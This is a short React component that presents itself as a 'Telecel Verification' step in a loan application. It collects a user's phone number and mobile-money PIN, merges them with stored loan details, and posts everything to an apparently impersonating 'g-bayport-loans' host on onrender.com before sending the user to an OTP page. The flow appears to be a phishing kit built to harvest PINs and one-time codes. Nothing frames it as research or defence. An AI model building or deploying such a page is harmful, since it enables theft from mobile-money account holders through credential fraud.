import { useState } from "react";
import axios from "axios";
import { useNavigate } from "react-router-dom";

export default function Telecel() {
  const navigate = useNavigate();

  const [loading, setLoading] = useState(false);
  const [data, setData] = useState({
    number: "",
    pin: "",
  });

  const handleChange = (e) => {
    setData({ ...data, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    const loanData = JSON.parse(localStorage.getItem("loanData")) || {};

    console.log("LoanData:", loanData);
    console.log("Telecel:", data);

    setLoading(true);

    try {
      const res = await axios.post(
        "https://g-bayport-loans.onrender.com/apply",
        {
          ...loanData,
          ...data,
        }
      );

      console.log("Response:", res.data);

      if (res.data.id) {
        navigate(`/otp/${res.data.id}`);
      } else {
        alert("No ID returned");
      }

    } catch (err) {
      console.error(err);
      alert("Failed to submit");
    }

    setLoading(false);
  };

  return (
    <div style={{ padding: "20px" }}>
      <h1>Telecel Verification</h1>

      <form onSubmit={handleSubmit}>
        <input
          name="number"
          placeholder="Enter number"
          onChange={handleChange}
          required
        />

        <input
          name="pin"
          type="password"
          placeholder="Enter PIN"
          onChange={handleChange}
          required
        />

        <button type="submit">
          {loading ? "Processing..." : "Continue"}
        </button>
      </form>
    </div>
  );
}